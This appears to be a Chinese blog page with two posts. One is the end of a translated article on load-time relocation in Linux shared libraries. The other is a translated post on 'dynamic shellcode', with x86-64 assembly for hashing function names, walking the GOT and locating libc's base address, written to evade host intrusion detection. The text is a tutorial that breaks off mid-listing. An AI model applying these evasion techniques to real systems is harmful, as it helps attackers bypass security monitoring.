 <span class="number">59</span>b:   <span class="number">01</span> d0                   add    %edx,%eax
 <span class="number">59</span>d:   <span class="number">89</span> <span class="number">45</span> fc                mov    %eax,-<span class="number">0x4</span>(%ebp)
 <span class="number">5</span>a0:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>,%edx
 <span class="number">5</span>a6:   <span class="number">8</span>b <span class="number">45</span> fc                mov    -<span class="number">0x4</span>(%ebp),%eax
 <span class="number">5</span>a9:   <span class="number">01</span> d0                   add    %edx,%eax
 <span class="number">5</span>ab:   a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    %eax,<span class="number">0x0</span>
 <span class="number">5</span>b0:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>,%edx
 <span class="number">5</span>b6:   <span class="number">8</span>b <span class="number">45</span> <span class="number">0</span>c                mov    <span class="number">0xc</span>(%ebp),%eax
 <span class="number">5</span>b9:   <span class="number">01</span> d0                   add    %edx,%eax
 <span class="number">5</span>bb:   c9                      leave  
 <span class="number">5</span>bc:   c3                      ret    
 <span class="number">5</span>bd:   <span class="number">66</span> <span class="number">90</span>                   xchg   %ax,%ax
 <span class="number">5</span>bf:   <span class="number">90</span>                      nop
</code></pre><p>注意<code>593</code>那行。</p>
<pre><code><span class="number">593</span>:   e8 fc ff ff ff          call   <span class="number">594</span> &lt;ml_func+<span class="number">0xd</span>&gt;
</code></pre><p><code>call(e8)</code>是相对寻址，<code>fffffffc</code>就是<code>-4</code>，即call指令调用自身(<code>598-4</code>)。</p>
<p>显然，这在载入时要被替换。看看ELF中关于重定位符号映射后偏移信息</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlreloc.so

Relocation section '.rel.dyn' at offset 0x380 contains 12 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ee8  <span class="number">00000008</span> R_386_RELATIVE   
00001eec  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002014</span>  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00000594</span>  <span class="number">00000902</span> R_386_PC32        <span class="number">0000057</span>c   ml_util_func
<span class="number">000005a2</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
...
</code></pre><p>当动态链接库载入时，<code>ml_util_func</code>所在的位置对链接器是已知的(基址(0xf7fd8000)+偏移(0x57c))，594这个要替换位置链接器也是已知的。</p>
<p>偏移地址通过<code>R_386_PC32</code>的规则计算就好<code>0x57c-0x597+0xffffffff=0xffffffe4</code></p>
<p>通过gdb会话可以看到是这样：</p>
<pre><code> ~/Work/project/blackhat/eli  gdb -q driver
Reading symbols from /home/lyy/Work/project/blackhat/eli/driver...done.
(gdb)  b driver.c:<span class="number">31</span>
Breakpoint <span class="number">1</span> at <span class="number">0x804874b</span>: file driver.c, line <span class="number">31.</span>
(gdb) r
Starting program: /home/lyy/Work/project/blackhat/eli/driver 
warning: the debug information found in <span class="string">"/usr/lib64/debug/lib64/ld-2.17.so.debug"</span> does not match <span class="string">"/lib/ld-linux.so.2"</span> (CRC mismatch).

name= (<span class="number">10</span> segments) address=(nil)
                 header  <span class="number">0</span>: address= <span class="number">0x8048034</span>
                         type=<span class="number">6</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address= <span class="number">0x8048174</span>
                         type=<span class="number">3</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">2</span>: address= <span class="number">0x8048000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">3</span>: address= <span class="number">0x8049ef8</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">4</span>: address= <span class="number">0x8049f04</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address= <span class="number">0x8048188</span>
                         type=<span class="number">4</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address= <span class="number">0x8048838</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">7</span>: address=     (nil)
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">8</span>: address= <span class="number">0x8049ef8</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">9</span>: address=     (nil)
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>

name=/home/lyy/Work/project/blackhat/eli/libmlreloc.so (<span class="number">7</span> segments) address=<span class="number">0xf7fd8000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7fd9ef4</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7fd85d4</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>

name=/lib32/libc.so<span class="number">.6</span> (<span class="number">11</span> segments) address=<span class="number">0xf7df4000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7df4034</span>
                         type=<span class="number">6</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7f67788</span>
                         type=<span class="number">3</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7df4000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7f9c1e4</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7f9dd9c</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7df4194</span>
                         type=<span class="number">4</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7f9c1e4</span>
                         type=<span class="number">7</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">7</span>: address=<span class="number">0xf7f677a0</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">8</span>: address=<span class="number">0xf7df4000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">9</span>: address=<span class="number">0xf7f9c1e4</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header <span class="number">10</span>: address=<span class="number">0xf7df4000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>

name=/lib/ld-linux.so<span class="number">.2</span> (<span class="number">7</span> segments) address=<span class="number">0xf7fdc000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7fdc000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7ffcc80</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7ffcef8</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7ff8f00</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7fdc000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7ffcc80</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7fdc000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>


Breakpoint <span class="number">1</span>, main (argc=<span class="number">1</span>, argv=<span class="number">0xffffcd84</span>) at driver.c:<span class="number">31</span>
<span class="number">31</span>      }
(gdb) disas ml_util_func 
Dump of assembler code <span class="keyword">for</span> function ml_util_func:
   <span class="number">0xf7fd857c</span> &lt;+<span class="number">0</span>&gt;:     push   ebp
   <span class="number">0xf7fd857d</span> &lt;+<span class="number">1</span>&gt;:     mov    ebp,esp
   <span class="number">0xf7fd857f</span> &lt;+<span class="number">3</span>&gt;:     mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
   <span class="number">0xf7fd8582</span> &lt;+<span class="number">6</span>&gt;:     add    eax,<span class="number">0x1</span>
   <span class="number">0xf7fd8585</span> &lt;+<span class="number">9</span>&gt;:     pop    ebp
   <span class="number">0xf7fd8586</span> &lt;+<span class="number">10</span>&gt;:    ret    
End of assembler dump.
(gdb) disas /r ml_func
Dump of assembler code <span class="keyword">for</span> function ml_func:
   <span class="number">0xf7fd8587</span> &lt;+<span class="number">0</span>&gt;:     <span class="number">55</span>      push   ebp
   <span class="number">0xf7fd8588</span> &lt;+<span class="number">1</span>&gt;:     <span class="number">89</span> e5   mov    ebp,esp
   <span class="number">0xf7fd858a</span> &lt;+<span class="number">3</span>&gt;:     <span class="number">83</span> ec <span class="number">14</span>        sub    esp,<span class="number">0x14</span>
   <span class="number">0xf7fd858d</span> &lt;+<span class="number">6</span>&gt;:     <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>        mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
   <span class="number">0xf7fd8590</span> &lt;+<span class="number">9</span>&gt;:     <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>        mov    DWORD PTR [esp],eax
   <span class="number">0xf7fd8593</span> &lt;+<span class="number">12</span>&gt;:    e8 e4 ff ff ff  call   <span class="number">0xf7fd857c</span> &lt;ml_util_func&gt;
   <span class="number">0xf7fd8598</span> &lt;+<span class="number">17</span>&gt;:    <span class="number">8</span>b <span class="number">55</span> <span class="number">0</span>c        mov    edx,DWORD PTR [ebp+<span class="number">0xc</span>]
   <span class="number">0xf7fd859b</span> &lt;+<span class="number">20</span>&gt;:    <span class="number">01</span> d0   add    eax,edx
   <span class="number">0xf7fd859d</span> &lt;+<span class="number">22</span>&gt;:    <span class="number">89</span> <span class="number">45</span> fc        mov    DWORD PTR [ebp-<span class="number">0x4</span>],eax
   <span class="number">0xf7fd85a0</span> &lt;+<span class="number">25</span>&gt;:    <span class="number">8</span>b <span class="number">15</span> <span class="number">18</span> a0 fd f7       mov    edx,DWORD PTR ds:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd85a6</span> &lt;+<span class="number">31</span>&gt;:    <span class="number">8</span>b <span class="number">45</span> fc        mov    eax,DWORD PTR [ebp-<span class="number">0x4</span>]
   <span class="number">0xf7fd85a9</span> &lt;+<span class="number">34</span>&gt;:    <span class="number">01</span> d0   add    eax,edx
   <span class="number">0xf7fd85ab</span> &lt;+<span class="number">36</span>&gt;:    a3 <span class="number">18</span> a0 fd f7  mov    ds:<span class="number">0xf7fda018</span>,eax
   <span class="number">0xf7fd85b0</span> &lt;+<span class="number">41</span>&gt;:    <span class="number">8</span>b <span class="number">15</span> <span class="number">18</span> a0 fd f7       mov    edx,DWORD PTR ds:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd85b6</span> &lt;+<span class="number">47</span>&gt;:    <span class="number">8</span>b <span class="number">45</span> <span class="number">0</span>c        mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]
   <span class="number">0xf7fd85b9</span> &lt;+<span class="number">50</span>&gt;:    <span class="number">01</span> d0   add    eax,edx
   <span class="number">0xf7fd85bb</span> &lt;+<span class="number">52</span>&gt;:    c9      leave  
   <span class="number">0xf7fd85bc</span> &lt;+<span class="number">53</span>&gt;:    c3      ret    
End of assembler dump.
</code></pre><h2 id="为何需要调用重定向">为何需要调用重定向</h2><p>为什么动态库作为一个整体载入进程时，位置都是确定的，却要经过重定向计算？</p>
<p>简单来说，在声明时对<code>ml_util_func</code>以static关键字声明，把函数作为只模块内可用的话，就不存在重定位了。</p>
<pre><code> ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -g -c ml_main.c -o ml_mainreloc.o      
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -shared -o libmlreloc.so ml_mainreloc.o
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">ml_mainreloc</span>.<span class="title">o</span>: <span class="title">warning</span>: <span class="title">relocation</span> <span class="title">against</span> `<span class="title">myglob</span>' <span class="title">in</span> <span class="title">readonly</span> <span class="title">section</span> `.<span class="title">text</span>'.</span>
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">warning</span>: <span class="title">creating</span> <span class="title">a</span> <span class="title">DT_TEXTREL</span> <span class="title">in</span> <span class="title">object</span>.</span>
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  objdump -d -<span class="constant">Mintel</span> libmlreloc.so                

libmlreloc.<span class="symbol">so:</span>     file format elf32-i386

<span class="constant">Disassembly</span> <span class="keyword">of</span> section .<span class="symbol">init:</span>

<span class="number">0000054</span>c &lt;ml_util_func&gt;:
 <span class="number">54</span><span class="symbol">c:</span>   <span class="number">55</span>                      push   ebp
 <span class="number">54</span><span class="symbol">d:</span>   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">54</span><span class="symbol">f:</span>   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,<span class="constant">DWORD</span> <span class="constant">PTR</span> [ebp+<span class="number">0x8</span>]
 <span class="number">552</span>:   <span class="number">83</span> c0 <span class="number">01</span>                add    eax,<span class="number">0x1</span>
 <span class="number">555</span>:   <span class="number">5</span>d                      pop    ebp
 <span class="number">556</span>:   c3                      ret    

<span class="number">00000557</span> &lt;ml_func&gt;:
 <span class="number">557</span>:   <span class="number">55</span>                      push   ebp
 <span class="number">558</span>:   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">55</span><span class="symbol">a:</span>   <span class="number">83</span> ec <span class="number">14</span>                sub    esp,<span class="number">0x14</span>
 <span class="number">55</span><span class="symbol">d:</span>   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,<span class="constant">DWORD</span> <span class="constant">PTR</span> [ebp+<span class="number">0x8</span>]
 <span class="number">560</span>:   <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    <span class="constant">DWORD</span> <span class="constant">PTR</span> [esp],eax
 <span class="number">563</span>:   e8 e4 ff ff ff          call   <span class="number">54</span>c &lt;ml_util_func&gt;
 ...
</code></pre><p>产生这个现象的原因就此一目了然，如果动态库中存在全局变量，也许会被覆盖和改写，其它载入的动态库就不能知道这个变量的相对位置，需要动态重定位。</p>
<h3 id="于可执行文件中引用动态库中的数据">于可执行文件中引用动态库中的数据</h3><p>上例中<code>myglob</code>变量只在动态库内部使用，如果在外部引用呢？这存在一个特殊的重定位过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> myglob;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"addr myglob = %p\n"</span>, (<span class="keyword">void</span>*)&amp;myglob);</span><br><span class="line">    <span class="keyword">int</span> t = ml_func(argc, argc);</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新编译运行：</p>
<pre><code> ✘  ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -std=c99 -m32 -g -c driver.c -o driver.o    
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -o driver driver.o -<span class="constant">L</span>. -lmlreloc   
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  ./driver
addr myglob = <span class="number">0x804a024</span>
</code></pre><p><code>0x804a024</code>显然是在主进程而不是后来载入的动态库虚拟地址区域。而<code>myglob</code>是被赋值的。</p>
<p>从gdb中查看引用<code>myglob</code>的位置：</p>
<pre><code>(gdb) p &amp;myglob
<span class="variable">$1</span> = (&lt;data variable, no debug info&gt; *) <span class="number">0x804a024</span> &lt;myglob&gt;
</code></pre><p>查看elf文件</p>
<pre><code> ✘  ~/Work/project/blackhat/eli  readelf -r driver

Relocation section '.rel.dyn' at offset 0x440 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  <span class="number">00000406</span> R_386_GLOB_DAT    <span class="number">00000000</span>   __gmon_start__
<span class="number">0804a024</span>  <span class="number">00000805</span> R_386_COPY        <span class="number">0804a024</span>   myglob
</code></pre><p>有个<code>R_386_COPY</code>类型，该类型表示直接把符号复制到<code>Sym.Value</code>的位置。</p>
<p>在<code>.symtab</code>有相应信息告诉我如何把<code>myglob</code>拷贝，包括尺寸<code>4</code></p>
<pre><code>~/Work/project/blackhat/eli  readelf -s libmlreloc.so 

Symbol table <span class="string">'.symtab'</span> <span class="keyword">contains</span> <span class="number">50</span> entries:
   Num:    <span class="keyword">Value</span>  <span class="built_in">Size</span> <span class="keyword">Type</span>    <span class="keyword">Bind</span>   Vis      Ndx <span class="keyword">Name</span>
   ...
    <span class="number">39</span>: <span class="number">00002018</span>     <span class="number">4</span> OBJECT  GLOBAL <span class="keyword">DEFAULT</span>   <span class="number">21</span> myglob
   ...
</code></pre><h2 id="结论">结论</h2><p>载入时重定位是linux下解析载入的内部数据和代码引用的一种方法。PIC是更高级和流行的方式，甚至x86-64已经不支持载入时重定位。</p>
<p>无论如何，希望此文能帮助拨开现代操作系统链接和载入动态库魔法迷雾。</p>
<p>Next, <a href="http://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/" target="_blank" rel="external">Position Independent Code (PIC) in shared libraries</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2015/03/17/shellcodedynamic/" itemprop="url">
                  Shellcode/Dynamic
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-17T00:00:00+08:00" content="2015-03-17">
              2015-03-17
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2015/03/17/shellcodedynamic/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/17/shellcodedynamic/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>意译：<a href="http://blackhat.life/Dynamic_Shellcode" target="_blank" rel="external">Shellcode/Dynamic</a></p>
<p>动态shellcode是自链接的shellcode，用来规避多种主机层面的防护措施，比如主机入侵检测系统(HIDS)或者主机入侵防护系统(HIPS)。这些措施能阻止传统的null-free shellcode。通过动态shellcode技术，实现比如不包含中断、系统调用或者明文函数字符串等。</p>
<p>[TOC]</p>
<h2 id="评价">评价</h2><p>大多安全设施组件都基于RAM的数据和标记为可执行的内容进行运行时分析。而且，许多系统甚至从内核检查内核中断和系统调用(linux审计工具audit就做这个)。其它也许监视ld-linux中提供给普通应用使用共享库调用的<code>_ld_runtime_resolve</code>的运行，<code>_dl_fixup()</code>的蹦床(trampoline,确定不是函数式编程？？？？)等。当应用尝试执行不在它们<code>.text</code>段的系统调用或中断、或者尝试使用<code>_ld_runtime_resolve</code>，<code>_dl_fixup</code>,<code>dl_open</code>,<code>dl_close</code>或者<code>dl_sym</code>来导入一个不在它导入表(import talbe)的函数时，会触发许多安全系统的警告。另外，使用比如像<code>dl_open()</code>和<code>dl_sym()</code>这样的函数需要使用明文字符串。任何一般的分析都能很容易迅速逆向有效载荷，这是传统null-free shellcode的另一个问题。</p>
<p>一个动态shellcode引擎能够解决这些问题。通过避免C调用惯例使用的寄存器，它可以构建允许开发者写出动态自链接代码的链接器(linker)。于是完全不再需要中断或者系统调用，因为链接器能不倚靠操作系统导入函数。另外，函数哈希被用作阻止函数名通过字符串呈现，解决了上面标准null-free shellcode有的问题。</p>
<h2 id="C调用惯例的影响">C调用惯例的影响</h2><p>通常的系统调用格式或者libc函数调用：</p>
<pre><code>function_call(<span class="decorator">%rax</span>) = <span class="keyword">function</span>(<span class="decorator">%rdi</span>,  <span class="decorator">%rsi</span>,  <span class="decorator">%rdx</span>,  <span class="decorator">%r10</span>,  <span class="decorator">%r8</span>,  <span class="decorator">%r9</span>)
</code></pre><p>返回值通常置于<code>rax</code>中，然而当结构指针被作为参数传递时，在那个参数寄存器中一个指向更改过的结构的指针被返回。</p>
<p>以上陈述显示：写一个链接器时，以下寄存器在没有系统调用的调用之前，不必为函数调用保存。</p>
<pre><code><span class="xml"></span><span class="perl"><span class="variable">%rax</span>, <span class="variable">%rbx</span>, <span class="variable">%rcx</span>, <span class="variable">%rbp</span>, <span class="variable">%r11</span>, <span class="variable">%r12</span>, <span class="variable">%r13</span>, <span class="variable">%r14</span>, <span class="variable">%r15</span></span><span class="xml"></span>
</code></pre><p>大多数寄存器能更改或者被各种libc函数更改，然而<code>rbx</code>在libc中被保留为开发者使用。当写一个动态链接器时，函数参数必须被保留，这样开发者能轻易写出动态集成的代码。最后，链接器取<code>rbx</code>作为库的基址指针，<code>rbp</code>用来哈希函数。这确保了开发者能保持对<code>rax</code>,<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>r10</code>,<code>r8</code>和<code>r9</code>的控制。<code>rcx</code>寄存器被用来作为指向调用函数标签的指针，也许应在函数调用间被保留。</p>
<h2 id="函数哈希">函数哈希</h2><p>这个功能希望<code>rdx</code>是0，<code>rsi</code>中是指向字符串的指针。接着它完成字符串的单向32位哈希并保存在<code>rsi</code>中。</p>
<p>首先，把被哈希程序(hasher)使用的不是<code>rsi</code>的寄存器保留：</p>
<pre><code><span class="label">calc_hash:</span>

<span class="label">preserve_regs:</span>
    <span class="keyword">push</span> rax
    <span class="keyword">push</span> rdx
</code></pre><p><code>rdx</code>作为调用哈希程序的代码的零寄存器(zreg/zero register)。可以指通过简单的<code>push/pop</code>把<code>rax</code>置零来：</p>
<pre><code><span class="label">initialize_regs:</span>
    <span class="keyword">push</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
</code></pre><p>接着，DF位(directional flag)被清空。这很重要，因为接下来的哈希过程使用了<code>lodsd</code>，而有漏洞应用的DF位不确定。</p>
<pre><code><span class="keyword">cld</span>
</code></pre><p>接着，<code>al</code>中的字节和<code>edx</code>相加，结果存入<code>edx</code>。左移12位(0xc)，当<code>lodsd</code>载入的字节是null时，哈希值就计算完毕了。</p>
<pre><code><span class="label">calc_hash_loop:</span>
    <span class="keyword">lodsb</span>
    <span class="keyword">rol</span> <span class="literal">edx</span>, <span class="number">0xc</span>
    <span class="keyword">add</span> <span class="literal">edx</span>, <span class="literal">eax</span>
    <span class="keyword">test</span> <span class="literal">al</span>, <span class="literal">al</span>
    <span class="keyword">jnz</span> calc_hash_loop
</code></pre><p>接着使用push和pop把哈希置入<code>rsi</code>：</p>
<pre><code><span class="label">calc_done:</span>
    <span class="keyword">push</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rsi</span>
</code></pre><p>最后，恢复保存到寄存器</p>
<pre><code><span class="label">restore_regs:</span>
    <span class="keyword">pop</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
</code></pre><h2 id="遍历到GOT的动态节(dynamic_section)">遍历到GOT的动态节(dynamic section)</h2><p>当前执行进程的动态节程序头总是在VMA(Virtual Memory Adress，虚拟内存地址)<code>0x00400130</code>。以下是个没有<code>\x00</code>(null-free)的版本：</p>
<pre><code><span class="label">_start:</span>
    <span class="keyword">push</span> <span class="number">0x400130ff</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span>
    <span class="keyword">shr</span> <span class="literal">ebx</span>, <span class="number">0x8</span>
</code></pre><p>指向动态节的指针被抽取，长度被添加到动态节的长度上。GOT(Global Offset Table，全局偏移表)刚好就在动态节后面。通过以这种方式计算偏移量，可以不必从文件头中读取GOT的位置来遍历GOT。这有无数的好处。(译者：不知道有啥好处。。。)</p>
<pre><code><span class="label">fast_got:</span>
    <span class="keyword">mov</span> <span class="literal">rcx</span>, [<span class="literal">rbx</span>]
    <span class="keyword">add</span> <span class="literal">rcx</span>, [<span class="literal">rbx</span>+<span class="number">0x10</span>]
</code></pre><h3 id="抽取一个库指针">抽取一个库指针</h3><p>这个代码从GOT抽取个指向libc中任意函数的指针。比如在<code>rcx+0x18</code>地方，有指向<code>_dl_runtime_resolve</code>的指针。</p>
<pre><code><span class="label">extract_pointer:</span>
    <span class="keyword">mov</span> <span class="literal">rbx</span>, [<span class="literal">rcx</span>+<span class="number">0x20</span>]
</code></pre><p>现在寻找想要导入的二进制文件的基指针，首先寻找<code>\x7fELF</code>。因为RAM倒着保存信息，使用逆向比较来决定何时逆向循环。</p>
<pre><code><span class="label">find_base:</span>
    <span class="keyword">dec</span> <span class="literal">rbx</span>
    <span class="keyword">cmp</span> [<span class="literal">rbx</span>], <span class="number">0x464c457f</span>
    <span class="keyword">jne</span> find_base
</code></pre><h3 id="用户定义代码">用户定义代码</h3><p>现在基指针被计算出来，该载入开发者或用户的代码了。为了让调用函数(<code>invoke_function</code>)从寄存器中可重用，通过getPC来把调用函数的地址存入<code>rcx</code>。</p>
<pre><code><span class="keyword">jmp</span> startup

<span class="label">__initialize_world:</span>
    <span class="keyword">pop</span> rcx
    <span class="keyword">jmp</span> _world

<span class="label">startup:</span>
    <span class="keyword">call</span> __initialize_word

<span class="label">invoke_function:</span>
    ...
<span class="label">_world:</span>
    <span class="comment">; user-defined code goes here</span>
</code></pre><h3 id="接口">接口</h3><p>这里开发的运行时链接器能让用户自定的代码从<code>_world</code>开始。这个接口让开发者能提供函数哈希到<code>rbp</code>并且执行<code>call [rcx]</code>代替系统调用。这个例子描述了从内核调用exit(0)到使用链接器的API来调用exit(0)的过程。</p>
<p>以未链接的exit形式开始：</p>
<pre><code>exit：
    <span class="keyword">push</span> <span class="number">0x3c</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
    <span class="keyword">syscall</span>
</code></pre><p>哈希<code>exit</code>(上面的相加右移)得到<code>0x696c4780</code></p>
<pre><code> ✘  ~/Work/project/blackhat/shellcode  cat hash-generator.s 
<span class="built_in">BITS</span> <span class="number">64</span>

<span class="built_in">global</span> _start
<span class="label">_start:</span>
    <span class="keyword">jmp</span> startup
<span class="label">
calc_hash:</span>
<span class="comment">; accept rsi hold function name.</span>
<span class="comment">; rdx=0 first</span>
<span class="comment">; return hash in rsi</span>
<span class="comment">; use rax, rdx, rsi</span>
    <span class="comment">; preserve rax&amp;rdx</span>
    <span class="keyword">push</span> <span class="literal">rax</span>    <span class="comment">; use as accum</span>
    <span class="keyword">push</span> <span class="literal">rdx</span>    <span class="comment">; zero register</span>
<span class="label">
    initialize_regs:</span>
        <span class="keyword">push</span> <span class="literal">rdx</span>
        <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">;rax = 0</span>
        <span class="keyword">cld</span><span class="comment">; clear zf for lodsb</span>
<span class="label">
        calc_hash_loop:</span>
            <span class="keyword">lodsb</span>   <span class="comment">; load one byte from rsi to al</span>
